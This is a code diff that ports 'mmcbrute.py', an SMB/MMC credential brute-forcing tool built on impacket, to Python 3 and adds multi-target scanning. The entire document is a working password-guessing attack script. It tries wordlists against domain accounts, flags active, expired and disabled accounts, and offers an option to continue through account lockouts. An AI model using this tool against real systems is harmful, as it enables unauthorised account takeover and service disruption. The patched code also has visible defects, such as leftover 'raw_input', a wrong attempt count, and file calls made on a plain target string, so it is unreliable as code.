@@ -1,9 +1,12 @@
-#!/usr/bin/python2
+#!/usr/bin/env python3
 #
 #  mmcbrute.py
 #
 #  Copyright 2017 Corey Gilks <CoreyGilks [at] gmail [dot] com>
 #  Twitter: @CoreyGilks
+#
+#  2to3 and upgrades contributed by phx (https://github.com/phx)
+#  Twitter: @rubynorails
 #
 #  This program is free software; you can redistribute it and/or modify
 #  it under the terms of the GNU General Public License as published by
@@ -29,11 +32,18 @@ import logging
 try:
 	from impacket.smbconnection import SMBConnection
 except ImportError:
-	print 'You must install impacket before continuing'
+	print('You must install impacket before continuing')
 	sys.exit(os.EX_SOFTWARE)
 
 def is_readable_file(path):
 	return os.path.isfile(path) and os.access(path, os.R_OK)
+
+class LoggingAdapter(logging.LoggerAdapter):
+	def process(self, msg, kwargs):
+		timestamp_true = kwargs.pop('time', self.extra['time'])
+		if timestamp_true:
+			return f"{datetime.datetime.now().astimezone().strftime('[%Y-%m-%d %I:%M:%S %p %z]')} {msg}", kwargs
+		return f"{msg}", kwargs
 
 class MMCBrute(object):
 	def __init__(self, usernames, passwords, domain, target, user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO'):
@@ -42,12 +52,16 @@ class MMCBrute(object):
 		self.usernames.seek(os.SEEK_SET)
 		self.domain = domain
 		self.target = target
+		self.targets = target
 		self.honeybadger = honeybadger
 		self.verbose = verbose
 		self.user_as_pass = user_as_pass
 		self.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))
+		self.log = logging.getLogger(__name__)
+		self.log = LoggingAdapter(self.log, {"time": None})
 		self.count = 0
 		self.len_passwords = 0
+		self.len_targets = 1
 
 		if passwords is not None:
 			self.passwords = open(passwords, 'r')
@@ -56,12 +70,16 @@ class MMCBrute(object):
 
 		if self.user_as_pass and passwords is not None:
 			self.len_passwords += 1
-
 		elif self.user_as_pass:
 			self.passwords = False
 			self.len_passwords += 1
 
-		self.totals = self.len_usernames * self.len_passwords
+		if is_readable_file(self.target):
+			self.targets = open(self.target, 'r')
+			self.len_targets = sum((1 for _ in self.targets))
+			self.targets.seek(os.SEEK_SET)
+
+		self.totals = self.len_targets * self.len_usernames * self.len_passwords
 
 	@classmethod
 	def from_args(cls, args):
@@ -69,95 +87,106 @@ class MMCBrute(object):
 
 	def update_progress(self):
 		self.count += 1
-		sys.stdout.write("Progress: {0}/{1} ({2}%)  \r".format(self.count, self.totals, (100 * self.count / self.totals)))
+		sys.stdout.write(f"Progress: {self.count}/{self.totals} ({(100 * self.count / self.totals)}%)  \r")
 		sys.stdout.flush()
 
 	def run(self):
-		smb_connection = SMBConnection(self.target, self.target)
-		for user in enumerate(self.usernames):
-			user = user[-1].strip()
-			if self.user_as_pass:
-				self.update_progress()
-				next_user = self.login(self.domain, user, user, smb_connection)
-				if next_user:
-					# Restablish smb_connection to avoid false positves
-					smb_connection.close()
-					smb_connection = SMBConnection(self.target, self.target)
-					continue
-
-			if self.passwords:
-				self.passwords.seek(os.SEEK_SET)
-				for password in enumerate(self.passwords):
+		self.targets.seek(os.SEEK_SET)
+		for target in self.targets:
+			target = target.strip()
+			self.target = target
+			smb_connection = SMBConnection(self.target, self.target)
+			for user in enumerate(self.usernames):
+				user = user[-1].strip()
+				if self.user_as_pass:
 					self.update_progress()
-					next_user = self.login(self.domain, user, password[-1].strip(), smb_connection)
+					next_user = self.login(self.target, self.domain, user, user, smb_connection)
 					if next_user:
 						# Restablish smb_connection to avoid false positves
 						smb_connection.close()
 						smb_connection = SMBConnection(self.target, self.target)
-						break
+						continue
+				if self.passwords:
+					self.passwords.seek(os.SEEK_SET)
+					for password in enumerate(self.passwords):
+						password = password[-1].strip()
+						self.update_progress()
+						next_user = self.login(self.target, self.domain, user, password, smb_connection)
+						if next_user:
+							# Restablish smb_connection to avoid false positves
+							smb_connection.close()
+							smb_connection = SMBConnection(self.target, self.target)
+							break
+			self.usernames.seek(os.SEEK_SET)
+			self.passwords.seek(os.SEEK_SET)
 
-	def login(self, domain, username, password, smb_connection):
-		attempt = "{0}/{1}:{2}".format(domain, username, password)
+	def login(self, target, domain, username, password, smb_connection):
+		attempt = f"{domain}/{username}:{password}"
 		try:
 			# This line will always raise an exception unless the credentials can initiate an smb connection
 			smb_connection.login(username, password, domain)
-			self.log.info("\033[92m[+] Success (Account Active) {0}\033[0m".format(attempt))
+			self.log.info(f"\033[92m[+] Success (Account Active) on {target}: {attempt}\033[0m", time=True)
 			return True
 
 		except Exception as msg:
 			msg = str(msg)
 			if 'STATUS_NO_LOGON_SERVERS' in msg:
-				self.log.info('\033[93m[-] No Logon Servers Available\033[0m')
+				self.log.info(f"\033[93m[-] No Logon Servers Available on {target}\033[0m", time=True)
 				sys.exit(os.EX_SOFTWARE)
 
 			elif 'STATUS_LOGON_FAILURE' in msg:
 				if self.verbose:
-					self.log.info("\033[91m[-] Failed {0}\033[0m".format(attempt))
+					self.log.info(f"\033[91m[-] Failed on {target}: {attempt}\033[0m", time=True)
 				return False
 
 			elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
-				print "\033[93m[-] Account Locked Out {0}\033[0m".format(attempt)
+				self.log.error(f"\033[93m[-] Account Locked Out on {target}: {attempt}\033[0m", time=True)
 				if not self.honeybadger:
 					self.log.info(
 						'\033[94m[!] Honey Badger mode not enabled. Halting to prevent further lockouts..\033[0m')
 					answer = str(raw_input('\033[94m[!] Would you like to proceed with the bruteforce? (Y/N) '))
-                                        if answer.lower() in ["y", "yes", ""]:
-                                                self.log.info('\033[93m[*] Resuming...')
-                                                return False
-                                        else:
-                                             	self.log.info('\033[91m[-]Exiting...')
-                                                sys.exit(os.EX_SOFTWARE)
+					if answer.lower() in ["y", "yes", ""]:
+							self.log.info('\033[93m[*] Resuming...', time=True)
+							return False
+					else:
+							self.log.info('\033[91m[-]Exiting...', time=True)
+							sys.exit(os.EX_SOFTWARE)
 
 			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
-				self.log.info("\033[92m[+] Success (User never logged in to change password) {0}\033[0m".format(attempt))
+				self.log.info(f"\033[92m[+] Success (User never logged in to change password) {attempt}\033[0m", time=True)
 
 			elif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:
-				self.log.info("\033[92m[+] Success (Account Active) {0}\033[0m".format(attempt))
+				self.log.info(f"\033[92m[+] Success (Account Active) {attempt}\033[0m", time=True)
 
 			elif 'STATUS_PASSWORD_EXPIRED' in msg:
-				self.log.info("\033[92m[+] Success (Password Expired) {0}\033[0m".format(attempt))
+				self.log.info(f"\033[92m[+] Success (Password Expired) {attempt}\033[0m", time=True)
 
 			elif 'STATUS_ACCOUNT_DISABLED' in msg:
-				self.log.info("\033[91m[-] Valid Password (Account Disabled) {0}\033[0m".format(attempt))
+				self.log.info(f"\033[91m[-] Valid Password (Account Disabled) {attempt}\033[0m", time=True)
 
 			else:
-				self.log.info("\033[91m[-] Unknown error: {0}\t{1}\033[0m".format(msg, attempt))
+				self.log.info(f"\033[91m[-] Unknown error: {msg}\t{attempt}\033[0m", time=True)
 			return True
 
 	def end(self):
-		self.log.info("\033[94m\nEnded at:\t\t{0:%I:%M %p on %B %d, %Y}\033[0m\n".format(datetime.datetime.now()))
+		self.log.info(f"\033[94m\n")
+		self.log.info(f"Ended at:\t\t{datetime.datetime.now().astimezone().strftime('%I:%M %p %z on %B %d, %Y')}\033[0m\n")
 
 	def info(self):
-		self.log.info("\033[94mTarget:\t\t\t{0}".format(self.target))
-		self.log.info("Username count:\t\t{0}".format(self.len_usernames))
-		self.log.info("Password count:\t\t{0}".format(self.len_passwords))
-		self.log.info("Estimated attempts:\t{0}".format(self.totals))
-		self.log.info("User-as-Pass Mode:\t{0!r}".format(self.user_as_pass))
-		self.log.info("Honey Badger Mode:\t{0!r}".format(self.honeybadger))
-		self.log.info("Verbose:\t\t{0!r}".format(self.verbose))
-		self.log.info("Time:\t\t\t{0:%I:%M %p on %B %d, %Y}\033[0m\n".format(datetime.datetime.now()))
+		self.log.info(f"\033[94mTarget:\t\t\t{self.target}")
+		self.log.info(f"Target count:\t\t{self.len_targets}")
+		self.log.info(f"Username count:\t\t{self.len_usernames}")
+		self.log.info(f"Password count:\t\t{self.len_passwords}")
+		self.log.info(f"Estimated attempts:\t{self.len_passwords}")
+		self.log.info(f"User-as-Pass Mode:\t{self.user_as_pass}")
+		self.log.info(f"Honey Badger Mode:\t{self.honeybadger}")
+		self.log.info(f"Verbose:\t\t{self.verbose}")
+		self.log.info(f"Time:\t\t\t{datetime.datetime.now().astimezone().strftime('%I:%M %p %z on %B %d, %Y')}\033[0m\n")
 
 if __name__ == '__main__':
+	script_path = os.path.dirname(os.path.abspath(__file__))
+	os.chdir(script_path)
+
 	parser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')
 	parser.add_argument('-L', dest='loglvl', action='store', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='INFO', help='set the logging level')
 	group = parser.add_argument_group('Bruteforce options')
@@ -179,8 +208,8 @@ if __name__ == '__main__':
 	if options.passwords is not None and not is_readable_file(options.passwords):
 		parser.error('The --passwords option must be a readable file')
 
+	brute = MMCBrute.from_args(options)
 	try:
-		brute = MMCBrute.from_args(options)
 		brute.info()
 		brute.run()
 	except KeyboardInterrupt:
